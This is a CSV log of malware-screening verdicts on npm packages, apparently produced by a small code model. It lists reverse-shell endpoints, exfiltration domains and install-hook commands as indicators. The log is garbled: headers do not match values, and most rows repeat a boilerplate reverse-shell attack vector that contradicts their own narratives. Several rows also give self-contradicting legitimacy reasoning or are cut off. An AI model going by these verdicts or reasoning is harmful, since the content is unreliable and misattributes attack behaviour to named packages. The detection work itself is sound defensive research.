package_name,version,timestamp,model_name,prompt_version,verdict,confidence,chain_score,is_coherent_chain,legitimacy_score,is_justified,explanation,chain_narrative,justification_reasoning,raw_response,parsed_json
1ru-cache,0.0.1,malicious,2026-03-27T13:00:47.575667,flag,1.0,MALICIOUS,0.96,0.7,The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204).,"[""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""]",False,"The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.96
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.96}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.""}}"
@aaakca/myf,1.0.14,malicious,2026-03-27T13:00:58.675841,review,0.336,MALICIOUS,0.72,0.7,The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README file and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file and no suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The `chain_analysis` section provides a narrative of the attack chain and the attack vector, the `chain_score` represents the confidence level of the attack chain, and the `verdict` indicates whether the package is malicious, suspicious, or benign. The `legitimacy_check` section provides information about whether the attack chain is justified based on the package's description and README file, and the `is_justified` field indicates whether the attack chain is justified.","{""chain_analysis"": {""chain_narrative"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file and no suspicious behavior is unjustified.""}}"
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-27T13:01:08.725764,review,0.364,MALICIOUS,0.78,0.78,The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack.,"[""https.request"", ""dc.70.lc"", ""443""]",False,No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."",
    ""attack_vector"": [""https.request"", ""dc.70.lc"", ""443""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.""
  }
}
```

This JSON object represents the analysis of the attack chain. The ""chain_analysis"" section provides a narrative of the attack chain, the attack vector (the key technical indicators used in the attack), the chain score (a measure of the confidence in the attack chain), and the verdict (whether the attack is malicious, suspicious, or benign). The ""legitimacy_check"" section provides information about whether the detected behaviors are justified by legitimate activities in the system.","{""chain_analysis"": {""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."", ""attack_vector"": [""https.request"", ""dc.70.lc"", ""443""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.""}}"
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-27T13:01:17.485841,review,0.494,MALICIOUS,0.71,0.7,"The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a rem","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a remote host, potentially for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a remote host, potentially for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.""}}"
@aszxc/npmexp,1.0.1,malicious,2026-03-27T13:01:28.212962,flag,1.0,MALICIOUS,0.9,0.7,The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222.,"[""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""]",False,"Package has no description or README file, and suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.9
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""Package has no description or README file, and suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain. The `chain_analysis` section provides a narrative of the attack chain, the attack vector (technical indicators used in the attack), the chain score (a measure of the severity of the attack), and the verdict (whether the package is malicious, suspicious, or benign). The `legitimacy_check` section provides information about whether the attack is justified based on the package's description or README file, and the reasoning behind the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""Package has no description or README file, and suspicious behavior is unjustified.""}}"
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-27T13:01:40.892384,review,0.364,MALICIOUS,0.78,0.7,The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments. The attack vector includes the commands 'postinstallhook', 'bash-c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a high level of confidence in the malicious intent. The verdict is 'MALICIOUS', indicating that the detected behaviors suggest a malicious intent. The legitimacy check indicates that the package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""}}"
@b2bgeo/yav,13.3.8,malicious,2026-03-27T13:01:48.554856,review,0.336,MALICIOUS,0.72,0.72,The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not justified as false.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not justified as false.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not justified as false.""}}"
@cuda-networks/bds-core,0.9.0,malicious,2026-03-27T13:01:56.451216,review,0.364,MALICIOUS,0.78,0.7,The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack.,"[""GET"", ""updates.secinfo.cf"", ""/cuda-networks-bds-core"", ""443""]",False,"The package has no description or README file, and the behavior is clearly anomalous.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack."",
    ""attack_vector"": [
      ""GET"",
      ""updates.secinfo.cf"",
      ""/cuda-networks-bds-core"",
      ""443""
    ],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the behavior is clearly anomalous.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack."", ""attack_vector"": [""GET"", ""updates.secinfo.cf"", ""/cuda-networks-bds-core"", ""443""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the behavior is clearly anomalous.""}}"
@doccledev/pattern-library,5.0.99,malicious,2026-03-27T13:02:04.641958,flag,1.0,MALICIOUS,0.79,0.7,The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""}}"
@drp-web/shared,1.2.7,malicious,2026-03-27T13:02:18.219948,flag,0.6333,MALICIOUS,0.95,0.95,"The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing ne","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"This package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.95,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The attack chain narrative summarizes the full attack using real package name and real IOCs. The attack vector includes the key technical indicators, real IPs, domains, commands, and API calls. The attack vector for a reverse shell is ['postinstallhook', 'bash-c', '34.x.x.x:4444', 'reverseshell']. The chain score is 0.95, indicating high confidence that this is a malicious intent. The verdict is 'MALICIOUS', and the confidence is 0.95. The legitimacy check verdict is 'false', indicating that the package has no description or README file, and no suspicious behavior is unjustified.""","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.95, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""}}"
